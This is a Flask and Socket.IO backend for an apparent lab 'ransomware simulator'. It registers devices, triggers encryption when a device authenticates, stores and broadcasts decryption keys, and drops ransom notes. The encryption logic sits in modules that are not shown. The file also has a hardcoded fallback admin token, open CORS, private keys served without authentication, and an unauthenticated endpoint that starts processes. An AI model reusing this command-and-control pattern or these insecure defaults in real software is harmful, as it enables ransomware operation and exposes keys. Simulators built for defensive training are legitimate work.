"""Flask backend with Socket.IO for the safe simulator.

Important: When running under eventlet (e.g., gunicorn -k eventlet), we must
monkey-patch BEFORE importing Flask or other network/WSGI modules.
"""

# Apply eventlet monkey patching early when available (no-op if not installed)
try:  # pragma: no cover - environment dependent
    import eventlet  # type: ignore
    eventlet.monkey_patch()
except Exception:
    pass

from flask import Flask, jsonify, request, Response
from flask_cors import CORS
from flask_socketio import SocketIO, emit
# Support both execution contexts:
# - Importing as a package (repo root on sys.path): py_simple.safe_ransomware_simulator
# - Running with service root as py_simple/: fallback to local module imports
try:
    from py_simple.safe_ransomware_simulator import SafeRansomwareSimulator
    from py_simple.behavior_simulator import BehaviorSimulator
except ImportError:  # pragma: no cover - runtime env dependent
    from safe_ransomware_simulator import SafeRansomwareSimulator
    from behavior_simulator import BehaviorSimulator
import os, json, socket, base64, sys, subprocess
from hashlib import sha256
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes
# Socket.IO for device signaling (encrypt/decrypt). Use permissive CORS for lab use.
socketio = SocketIO(app, cors_allowed_origins="*")

# Initialize the simulator; allow override via env var SANDBOX_DIR
simulator = SafeRansomwareSimulator(os.getenv('SANDBOX_DIR') or None)

# Simple in-memory device registry: token -> { sid, connected, pending_encrypt }
DEVICES = {}
behavior = BehaviorSimulator(simulator.test_directory)

@app.route('/status', methods=['GET'])
def status():
    return jsonify({'ok': True, 'hostname': socket.gethostname()})

@app.route('/whoami', methods=['GET'])
def whoami():
    try:
        forwarded = request.headers.get('X-Forwarded-For')
        ip = (forwarded.split(',')[0].strip() if forwarded else request.remote_addr) or ''
        ua = request.headers.get('User-Agent', '')
        return jsonify({'ip': ip, 'forwarded_for': forwarded, 'user_agent': ua, 'server': socket.gethostname()})
    except Exception as e:
        return jsonify({'error': 'whoami_failed', 'message': str(e)}), 500

# --- /py_simple route wrappers for frontend base path ---
@app.route('/py_simple/status', methods=['GET'])
def status_prefixed():
    return status()

@app.route('/py_simple/whoami', methods=['GET'])
def whoami_prefixed():
    return whoami()

@app.route('/py_simple', methods=['GET'])
def py_simple_ui():
        """Serve a minimal UI to manage devices and trigger decrypt on the backend host."""
        html = """
<!doctype html>
<html lang=\"en\">
    <head>
        <meta charset=\"utf-8\" />
        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />
        <title>py_simple · Device Control</title>
        <style>
            :root { --bg:#0f172a; --panel:#0b1222; --muted:#94a3b8; --text:#e2e8f0; --primary:#6366f1; --border:#1f2a44; }
            html,body { height:100%; } body { margin:0; background:linear-gradient(180deg,#0b1020,#0d1428 40%,#0f172a); color:var(--text); font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial; }
            .wrap { max-width: 900px; margin: 0 auto; padding: 1.25rem; }
            .card { background: var(--panel); border:1px solid var(--border); border-radius: 14px; padding: 1rem; box-shadow: 0 6px 20px rgba(0,0,0,.25); margin-top:1rem; }
            .row { display:flex; gap:.75rem; align-items:center; flex-wrap: wrap; }
            .label { color:var(--muted); margin-right:.25rem; }
            .input, select { background:#0a0f1d; color:var(--text); border:1px solid var(--border); border-radius:10px; padding:.5rem .6rem; }
            .btn { appearance:none; border:1px solid var(--border); background:#1b2140; color:var(--text); padding:.55rem .9rem; border-radius:10px; cursor:pointer; }
            .btn.primary { border-color:#4f46e5; background:#4f46e5; } .btn.primary:hover { background:#6366f1; }
            .btn.ghost { background:rgba(255,255,255,.05); }
            .kv { margin-top:.5rem; } .kv .k { color:var(--muted); margin-right:.5rem; } .kv > div { display:flex; gap:.75rem; padding:.25rem 0; border-bottom:1px dashed rgba(148,163,184,.15); }
            textarea { width:100%; min-height:130px; background:#0a0f1d; color:var(--text); border:1px solid var(--border); border-radius:10px; padding:.6rem; }
            .muted { color:var(--muted); }
        </style>
    </head>
    <body>
        <div class=\"wrap\">
            <h1>py_simple · Device Control</h1>
            <p class=\"muted\">Manage connected devices on this backend, view keys, and trigger decryption.</p>

            <div class=\"card\" id=\"whoami\"></div>

            <div class=\"card\">
                <div class=\"row\">
                    <span class=\"label\">Devices</span>
                    <select id=\"deviceSel\"></select>
                    <button class=\"btn ghost\" id=\"refreshBtn\">Refresh</button>
                    <button class=\"btn primary\" id=\"decryptBtn\">Decrypt Selected</button>
                </div>
                <div id=\"devMeta\" class=\"kv\"></div>
            </div>

            <div class=\"card\">
                <div class=\"row\" style=\"justify-content:space-between;\">
                    <h3 style=\"margin:.25rem 0;\">Keys</h3>
                    <div>
                        <button class=\"btn\" id=\"genKeys\">Generate Key Pair</button>
                        <button class=\"btn\" id=\"attachKeys\">Attach to Device</button>
                    </div>
                </div>
                <div style=\"display:grid; grid-template-columns: 1fr 1fr; gap: .75rem;\">
                    <div>
                        <div class=\"label\">Generated Public Key (PEM)</div>
                        <textarea id=\"pub\" placeholder=\"Generate to populate…\"></textarea>
                    </div>
                    <div>
                        <div class=\"label\">Generated Private Key (PEM)</div>
                        <textarea id=\"prv\" placeholder=\"Generate to populate…\"></textarea>
                    </div>
                </div>
                <div style=\"display:grid; grid-template-columns: 1fr 1fr; gap: .75rem; margin-top:.75rem;\">
                    <div>
                        <div class=\"label\">Device Public Key (stored)</div>
                        <textarea id=\"devPub\" readonly></textarea>
                    </div>
                    <div>
                        <div class=\"label\">Device Private Key (stored)</div>
                        <textarea id=\"devPrv\" readonly></textarea>
                    </div>
                </div>
            </div>

            <div class=\"card muted\" id=\"status\">Ready.</div>
        </div>

        <script>
            const apiBase = location.origin + '/py_simple';
            const els = {
                who: document.getElementById('whoami'), sel: document.getElementById('deviceSel'),
                meta: document.getElementById('devMeta'), refresh: document.getElementById('refreshBtn'),
                decrypt: document.getElementById('decryptBtn'), status: document.getElementById('status'),
                gen: document.getElementById('genKeys'), attach: document.getElementById('attachKeys'),
                pub: document.getElementById('pub'), prv: document.getElementById('prv'),
                devPub: document.getElementById('devPub'), devPrv: document.getElementById('devPrv'),
            };

            function setStatus(msg) { els.status.textContent = msg; }

            async function fetchJSON(url, opts) {
                const r = await fetch(url, Object.assign({ headers: { 'Content-Type': 'application/json' } }, opts));
                let data = null; try { data = await r.json(); } catch (_) {}
                if (!r.ok) throw new Error((data && (data.message || data.error)) || ('HTTP ' + r.status));
                return data || {};
            }

            async function loadWho() {
                try {
                    const data = await fetchJSON(apiBase + '/whoami');
                    els.who.innerHTML = '<div class="kv">\n' +
                        '<div><span class="k">Your IP</span><span class="v">' + (data.ip||'—') + '</span></div>\n' +
                        '<div><span class="k">Forwarded-For</span><span class="v">' + (data.forwarded_for||'—') + '</span></div>\n' +
                        '<div><span class="k">Server</span><span class="v">' + (data.server||'—') + '</span></div>\n' +
                    '</div>';
                } catch(e) { els.who.textContent = 'whoami failed: ' + e.message }
            }

            let devices = [];
            function currentToken() { return els.sel.value || (devices[0] && devices[0].token) || ''; }
            function renderDevices() {
                els.sel.innerHTML = devices.map(d => {
                    const label = (d.hostname || d.token.slice(0,8)) + ' • ' + (d.ip||'ip?') + ' • ' + (d.connected? 'online':'offline');
                    return '<option value="' + d.token + '">' + label + '</option>';
                }).join('');
                const tok = currentToken();
                const d = devices.find(x => x.token === tok) || null;
                els.meta.innerHTML = d ? (
                    '<div><span class="k">Token</span><span class="v">' + d.token + '</span></div>' +
                    '<div><span class="k">Hostname</span><span class="v">' + (d.hostname||'—') + '</span></div>' +
                    '<div><span class="k">IP</span><span class="v">' + (d.ip||'—') + '</span></div>' +
                    '<div><span class="k">Connected</span><span class="v">' + (d.connected? 'yes':'no') + '</span></div>'
                ) : '';
                els.devPub.value = (d && d.public_key_pem) || '';
                els.devPrv.value = (d && d.private_key_pem) || '';
            }

            async function loadDevices() {
                try { const data = await fetchJSON(apiBase + '/devices'); devices = data.devices||[]; renderDevices(); setStatus('Devices loaded'); }
                catch (e) { setStatus('Failed to load devices: ' + e.message); }
            }

            async function decryptSelected() {
                const tok = currentToken(); if (!tok) return setStatus('Select a device first');
                try { const data = await fetchJSON(apiBase + '/decrypt', { method: 'POST', body: JSON.stringify({ token: tok }) }); setStatus(data.status || 'Decrypt signal sent'); }
                catch (e) { setStatus('Decrypt failed: ' + e.message); }
            }

            async function generateKeys() {
                try {
                    const data = await fetchJSON(apiBase + '/keys/rsa', { method: 'POST', body: JSON.stringify({}) });
                    els.pub.value = data.public_key_pem || ''; els.prv.value = data.private_key_pem || '';
                    setStatus('Generated key pair');
                } catch (e) { setStatus('Keygen failed: ' + e.message); }
            }

            async function attachKeys() {
                const tok = currentToken(); if (!tok) return setStatus('Select a device first');
                const body = { public_key_pem: els.pub.value || undefined, private_key_pem: els.prv.value || undefined };
                if (!body.public_key_pem && !body.private_key_pem) return setStatus('Generate keys first');
                try {
                    await fetchJSON(apiBase + '/devices/' + tok + '/keys', { method: 'POST', body: JSON.stringify(body) });
                    await loadDevices(); setStatus('Keys attached to device');
                } catch (e) { setStatus('Attach failed: ' + e.message); }
            }

            els.refresh.addEventListener('click', loadDevices);
            els.decrypt.addEventListener('click', decryptSelected);
            els.gen.addEventListener('click', generateKeys);
            els.attach.addEventListener('click', attachKeys);
            els.sel.addEventListener('change', renderDevices);

            loadWho();
            loadDevices();
        </script>
    </body>
</html>
        """
        return Response(html, mimetype='text/html')

@app.route('/key', methods=['GET'])
def get_key():
    """Return the encryption key"""
    return jsonify({'key': simulator.get_key()})

# Key generation endpoints consolidated here
@app.route('/keys/aes', methods=['POST'])
def keys_aes():
    try:
        key = os.urandom(32)
        b64 = base64.b64encode(key).decode()
        fingerprint = sha256(key).hexdigest()
        redacted = f"{b64[:6]}...{b64[-6:]}"
        return jsonify({'algorithm': 'AES-256-GCM', 'key_redacted': redacted, 'fingerprint_sha256': fingerprint})
    except Exception as e:
        return jsonify({'error': 'aes_keygen_failed', 'message': str(e)}), 500

@app.route('/py_simple/keys/aes', methods=['POST'])
def keys_aes_prefixed():
    return keys_aes()

@app.route('/keys/aes/private', methods=['POST'])
def keys_aes_private():
    admin = os.getenv('ADMIN_TOKEN', 'secretfr')
    provided = request.headers.get('X-ADMIN-TOKEN') or request.args.get('token')
    if not admin or provided != admin:
        return jsonify({'error': 'forbidden', 'message': 'Admin token required'}), 403
    try:
        key = os.urandom(32)
        b64 = base64.b64encode(key).decode()
        return jsonify({'algorithm': 'AES-256-GCM', 'key_base64': b64})
    except Exception as e:
        return jsonify({'error': 'aes_keygen_failed', 'message': str(e)}), 500

@app.route('/py_simple/keys/aes/private', methods=['POST'])
def keys_aes_private_prefixed():
    return keys_aes_private()

@app.route('/keys/rsa', methods=['POST'])
def keys_rsa():
    try:
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()
        pub_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()
        prv_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ).decode()

        pub_hash = sha256(pub_pem.encode()).hexdigest()
        prv_hash = sha256(prv_pem.encode()).hexdigest()

        forwarded = request.headers.get('X-Forwarded-For')
        requester_ip = (forwarded.split(',')[0].strip() if forwarded else request.remote_addr) or ''
        data = request.get_json(silent=True) or {}
        provided_hostname = data.get('hostname')

        record = {'timestamp': int(__import__('time').time()), 'requester_ip': requester_ip, 'requester_hostname': provided_hostname}
        try:
            with open('last_key_request.json', 'w', encoding='utf-8') as f:
                json.dump(record, f, indent=2)
        except Exception:
            pass

        return jsonify({
            'algorithm': 'RSA-2048',
            'public_key_pem': pub_pem,
            'private_key_pem': prv_pem,
            'public_key_fingerprint_sha256': pub_hash,
            'private_key_fingerprint_sha256': prv_hash,
            'device': record,
        })
    except Exception as e:
        return jsonify({'error': 'rsa_keygen_failed', 'message': str(e)}), 500

@app.route('/py_simple/keys/rsa', methods=['POST'])
def keys_rsa_prefixed():
    return keys_rsa()

@app.route('/keys/last-request', methods=['GET'])
def keys_last_request():
    try:
        if not os.path.exists('last_key_request.json'):
            return jsonify({})
        with open('last_key_request.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
        return jsonify(data)
    except Exception as e:
        return jsonify({'error': 'read_failed', 'message': str(e)}), 500

@app.route('/py_simple/keys/last-request', methods=['GET'])
def keys_last_request_prefixed():
    return keys_last_request()

@app.route('/keys/rsa/private', methods=['POST'])
def keys_rsa_private():
    admin = os.getenv('ADMIN_TOKEN', 'secretfr')
    provided = request.headers.get('X-ADMIN-TOKEN') or request.args.get('token')
    if not admin or provided != admin:
        return jsonify({'error': 'forbidden', 'message': 'Admin token required'}), 403
    try:
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        prv_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ).decode()
        return jsonify({'algorithm': 'RSA-2048', 'private_key_pem': prv_pem})
    except Exception as e:
        return jsonify({'error': 'rsa_keygen_failed', 'message': str(e)}), 500

@app.route('/py_simple/keys/rsa/private', methods=['POST'])
def keys_rsa_private_prefixed():
    return keys_rsa_private()

@app.route('/publickey', methods=['POST'])
def publickey_register():
    """Device requests a public key and receives a device token for WebSocket auth.
    This is a lab/demo endpoint.
    """
    try:
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()
        pub_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()

        # Record device info
        forwarded = request.headers.get('X-Forwarded-For')
        requester_ip = (forwarded.split(',')[0].strip() if forwarded else request.remote_addr) or ''
        data = request.get_json(silent=True) or {}
        provided_hostname = data.get('hostname')

        # Create a device token and mark encryption to be triggered on WS auth
        import secrets
        token = secrets.token_hex(16)
        DEVICES[token] = { 'sid': None, 'connected': False, 'pending_encrypt': True, 'ip': requester_ip, 'hostname': provided_hostname }

        record = {'timestamp': int(__import__('time').time()), 'requester_ip': requester_ip, 'requester_hostname': provided_hostname}
        try:
            with open('last_key_request.json', 'w', encoding='utf-8') as f:
                json.dump(record, f, indent=2)
        except Exception:
            pass

        # ws_url is same origin as HTTP base
        ws_url = request.host_url.rstrip('/')
        return jsonify({
            'public_key_pem': pub_pem,
            'device_token': token,
            'ws_url': ws_url,
            'device': record,
        })
    except Exception as e:
        return jsonify({'error': 'publickey_failed', 'message': str(e)}), 500

@app.route('/py_simple/publickey', methods=['POST'])
def publickey_register_prefixed():
    return publickey_register()

@app.route('/encrypt', methods=['POST'])
def encrypt():
    """Trigger encryption locally on the backend (fallback).
    For device-based flow, encryption is signaled via WebSocket upon auth.
    """
    try:
        files = simulator.simulate_encryption()
        return jsonify({'status': 'Encryption completed successfully', 'files': files})
    except Exception as e:
        return jsonify({'status': 'Encryption failed', 'error': str(e)}), 500

@app.route('/py_simple/encrypt', methods=['POST'])
def encrypt_prefixed():
    return encrypt()

@app.route('/decrypt', methods=['POST'])
def decrypt():
    """Trigger decryption of files.
    If devices are connected via WebSocket, emit a decrypt signal to them.
    Otherwise, perform local simulator decryption as a fallback.
    """
    try:
        payload = request.get_json(silent=True) or {}
        private_key_pem = payload.get('private_key_pem')
        target_token = payload.get('token')
        # If a specific device token is provided and connected, emit only to that device
        if target_token and target_token in DEVICES and DEVICES[target_token].get('sid'):
            sid = DEVICES[target_token]['sid']
            # If no private key provided in request, try to use stored device key
            if not private_key_pem:
                private_key_pem = DEVICES[target_token].get('private_key_pem')
            emit_payload = ({'private_key_pem': private_key_pem} if private_key_pem else None)
            socketio.emit('decrypt', emit_payload, to=sid)
            # Also attempt local decrypt as a safety net
            try:
                simulator.simulate_decryption()
            except Exception:
                pass
            return jsonify({'status': 'Decrypt signal sent to device', 'token': target_token}), 200
        # Otherwise broadcast to all connected clients in this process, optionally passing a private key.
        emit_payload = ({'private_key_pem': private_key_pem} if private_key_pem else None)
        socketio.emit('decrypt', emit_payload, broadcast=True)
        # Also attempt local decrypt as a safety net (no harm if no local files)
        try:
            simulator.simulate_decryption()
        except Exception:
            pass
        # Report approximate connected devices if available
        connected = sum(1 for _t, info in DEVICES.items() if info.get('connected')) if DEVICES else None
        if connected is not None:
            return jsonify({'status': f'Decrypt signal broadcasted', 'connected_devices': connected}), 200
        return jsonify({'status': 'Decrypt signal broadcasted'}), 200
    except Exception as e:
        return jsonify({'status': 'Decryption failed', 'error': str(e)}), 500

@app.route('/py_simple/decrypt', methods=['POST'])
def decrypt_prefixed():
    return decrypt()

@app.route('/devices', methods=['GET'])
def devices_state():
    """Inspect connected devices (lab diagnostics)."""
    try:
        out = []
        for token, info in DEVICES.items():
            out.append({
                'token': token,
                'connected': bool(info.get('connected')),
                'ip': info.get('ip'),
                'hostname': info.get('hostname'),
                'has_sid': bool(info.get('sid')),
                'public_key_pem': info.get('public_key_pem'),
                'private_key_pem': info.get('private_key_pem')
            })
        return jsonify({'count': len(out), 'devices': out})
    except Exception as e:
        return jsonify({'error': 'inspect_failed', 'message': str(e)}), 500

@app.route('/py_simple/devices', methods=['GET'])
def devices_state_prefixed():
    return devices_state()

@app.route('/devices/<token>/public-key', methods=['POST'])
def set_device_public_key(token: str):
    """Attach a site-generated public key to a device token (lab/demo)."""
    try:
        if token not in DEVICES:
            return jsonify({'error': 'not_found'}), 404
        data = request.get_json(silent=True) or {}
        pem = data.get('public_key_pem')
        if not pem:
            return jsonify({'error': 'bad_request', 'message': 'public_key_pem required'}), 400
        DEVICES[token]['public_key_pem'] = pem
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': 'set_failed', 'message': str(e)}), 500

@app.route('/py_simple/devices/<token>/public-key', methods=['POST'])
def set_device_public_key_prefixed(token: str):
    return set_device_public_key(token)

@app.route('/devices/<token>/keys', methods=['POST'])
def set_device_keys(token: str):
    """Attach site-generated public/private keys to a device token (lab/demo)."""
    try:
        if token not in DEVICES:
            return jsonify({'error': 'not_found'}), 404
        data = request.get_json(silent=True) or {}
        pub = data.get('public_key_pem')
        prv = data.get('private_key_pem')
        if not pub and not prv:
            return jsonify({'error': 'bad_request', 'message': 'public_key_pem or private_key_pem required'}), 400
        if pub:
            DEVICES[token]['public_key_pem'] = pub
        if prv:
            DEVICES[token]['private_key_pem'] = prv
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': 'set_failed', 'message': str(e)}), 500

@app.route('/py_simple/devices/<token>/keys', methods=['POST'])
def set_device_keys_prefixed(token: str):
    return set_device_keys(token)

@app.route('/behavior/notes', methods=['POST'])
def behavior_notes():
    files = behavior.drop_ransom_notes()
    return jsonify({'status': 'ok', 'files': files})

@app.route('/py_simple/behavior/notes', methods=['POST'])
def behavior_notes_prefixed():
    return behavior_notes()

@app.route('/behavior/registry', methods=['POST'])
def behavior_registry():
    result = behavior.simulate_registry_changes()
    return jsonify(result)

@app.route('/py_simple/behavior/registry', methods=['POST'])
def behavior_registry_prefixed():
    return behavior_registry()

@app.route('/behavior/registry/cleanup', methods=['POST'])
def behavior_registry_cleanup():
    result = behavior.cleanup_registry()
    return jsonify(result)

@app.route('/py_simple/behavior/registry/cleanup', methods=['POST'])
def behavior_registry_cleanup_prefixed():
    return behavior_registry_cleanup()

@app.route('/behavior/network', methods=['POST'])
def behavior_network():
    result = behavior.simulate_network_activity()
    return jsonify(result)

@app.route('/py_simple/behavior/network', methods=['POST'])
def behavior_network_prefixed():
    return behavior_network()

@app.route('/behavior/discovery', methods=['POST'])
def behavior_discovery():
    result = behavior.simulate_discovery()
    return jsonify(result)

@app.route('/py_simple/behavior/discovery', methods=['POST'])
def behavior_discovery_prefixed():
    return behavior_discovery()

@app.route('/behavior/commands', methods=['POST'])
def behavior_commands():
    path = behavior.simulate_command_strings()
    return jsonify({'status': 'ok', 'file': path})

@app.route('/py_simple/behavior/commands', methods=['POST'])
def behavior_commands_prefixed():
    return behavior_commands()

# --- CAPE agent integration (lab/demo) ---
@app.route('/cape/report', methods=['POST'])
def cape_report():
    """Accept a CAPE agent JSON report and persist it under cape_reports/.
    Not authenticated for lab simplicity; add token/header checks if exposing.
    """
    try:
        # Optional token auth: set CAPE_TOKEN env in backend to require header
        expected = os.getenv('CAPE_TOKEN')
        if expected:
            provided = request.headers.get('X-CAPE-TOKEN')
            if provided != expected:
                return jsonify({'error': 'forbidden'}), 403
        data = request.get_json(force=True, silent=False)
        os.makedirs('cape_reports', exist_ok=True)
        import time, uuid
        ts = time.strftime('%Y%m%d-%H%M%S')
        fname = f"report_{ts}_{uuid.uuid4().hex[:8]}.json"
        fpath = os.path.join('cape_reports', fname)
        with open(fpath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2)
        # Also update a last.json pointer for convenience
        with open(os.path.join('cape_reports', 'last.json'), 'w', encoding='utf-8') as f:
            json.dump({ 'path': fpath, 'created': ts }, f, indent=2)
        return jsonify({'status': 'ok', 'saved': fpath})
    except Exception as e:
        return jsonify({'error': 'persist_failed', 'message': str(e)}), 400

@app.route('/py_simple/cape/report', methods=['POST'])
def cape_report_prefixed():
    return cape_report()

# --- Device client process management (lab/demo) ---
@app.route('/py_simple/device/start', methods=['POST'])
def start_device_client():
    """Start the device_client.py as a background process on the server host.
    Lab-only convenience to demonstrate end-to-end flow. Returns PID on success.
    """
    try:
        payload = request.get_json(silent=True) or {}
        backend_base = payload.get('backend') or request.host_url.rstrip('/')
        # Optional args
        extra_args = []
        if payload.get('polling'):
            extra_args.append('--polling')
        if payload.get('debug'):
            extra_args.append('--debug')
        if payload.get('insecure'):
            extra_args.append('--insecure')
        # Compute absolute path to device_client.py
        here = os.path.dirname(os.path.abspath(__file__))
        client_path = os.path.join(here, 'device_client.py')
        if not os.path.exists(client_path):
            return jsonify({'error': 'not_found', 'message': 'device_client.py missing'}), 404
        cmd = [sys.executable, '-u', client_path, '--backend', backend_base]
        cmd.extend(extra_args)
        # Launch detached
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return jsonify({'status': 'started', 'pid': proc.pid})
    except Exception as e:
        return jsonify({'error': 'start_failed', 'message': str(e)}), 500

if __name__ == '__main__':
    # For local dev. In production on Render, run with gunicorn -k eventlet ... server:app
    socketio.run(app, debug=True, port=5000)

# --- Socket.IO handlers ---
@socketio.on('connect')
def on_connect():
    emit('hello', {'msg': 'connected'})

@socketio.on('authenticate')
def on_auth(data):
    token = (data or {}).get('device_token')
    if not token or token not in DEVICES:
        return emit('auth_error', {'error': 'invalid_token'})
    DEVICES[token]['sid'] = request.sid
    DEVICES[token]['connected'] = True
    emit('auth_ok', {'status': 'ok'})
    # If encryption is pending for this device, trigger it now (one-time)
    if DEVICES[token].get('pending_encrypt'):
        socketio.emit('encrypt', to=request.sid)
        DEVICES[token]['pending_encrypt'] = False

@socketio.on('device_hello')
def on_device_hello(data):
    """Receive device metadata and public key over the socket."""
    try:
        token = (data or {}).get('device_token')
        if not token:
            # Try to resolve from sid
            sid = request.sid
            for t, info in DEVICES.items():
                if info.get('sid') == sid:
                    token = t
                    break
        if not token or token not in DEVICES:
            return
        DEVICES[token]['public_key_pem'] = (data or {}).get('public_key_pem')
        if (data or {}).get('hostname'):
            DEVICES[token]['hostname'] = data['hostname']
        # Update requester IP based on this socket connect if available
        try:
            from flask import request as _rq
            ip = _rq.remote_addr
            if ip:
                DEVICES[token]['ip'] = ip
        except Exception:
            pass
        emit('server_ack', {'status': 'ok'})
    except Exception:
        pass

@socketio.on('disconnect')
def on_disconnect():
    # Mark any known device with this sid as disconnected
    try:
        sid = request.sid
        for token, info in DEVICES.items():
            if info.get('sid') == sid:
                info['connected'] = False
                info['sid'] = None
                break
    except Exception:
        pass

@socketio.on('site_public_key')
def on_site_public_key(data):
    """Site sends a public key to associate with a device token."""
    try:
        token = (data or {}).get('token')
        pem = (data or {}).get('public_key_pem')
        if not token or token not in DEVICES or not pem:
            return emit('server_ack', {'status': 'error'})
        DEVICES[token]['public_key_pem'] = pem
        emit('server_ack', {'status': 'ok'})
    except Exception:
        emit('server_ack', {'status': 'error'})

@socketio.on('site_decrypt')
def on_site_decrypt(data):
    """Site triggers decrypt. If token provided, target that device; else broadcast.
    Optionally carries a private key; otherwise uses stored key for the device if available.
    """
    try:
        token = (data or {}).get('token')
        private_key_pem = (data or {}).get('private_key_pem')
        if token and token in DEVICES and DEVICES[token].get('sid'):
            sid = DEVICES[token]['sid']
            if not private_key_pem:
                private_key_pem = DEVICES[token].get('private_key_pem')
            payload = {'private_key_pem': private_key_pem} if private_key_pem else None
            socketio.emit('decrypt', payload, to=sid)
            emit('server_ack', {'status': 'ok', 'targeted': True})
            return
        # Fallback to broadcast
        payload = {'private_key_pem': private_key_pem} if private_key_pem else None
        socketio.emit('decrypt', payload, broadcast=True)
        emit('server_ack', {'status': 'ok', 'targeted': False})
    except Exception as e:
        emit('server_ack', {'status': 'error', 'message': str(e)})

@socketio.on('site_keys')
def on_site_keys(data):
    """Site sends both public/private keys to associate with a device token."""
    try:
        token = (data or {}).get('token')
        pub = (data or {}).get('public_key_pem')
        prv = (data or {}).get('private_key_pem')
        if not token or token not in DEVICES or (not pub and not prv):
            return emit('server_ack', {'status': 'error'})
        if pub:
            DEVICES[token]['public_key_pem'] = pub
        if prv:
            DEVICES[token]['private_key_pem'] = prv
        emit('server_ack', {'status': 'ok'})
    except Exception:
        emit('server_ack', {'status': 'error'})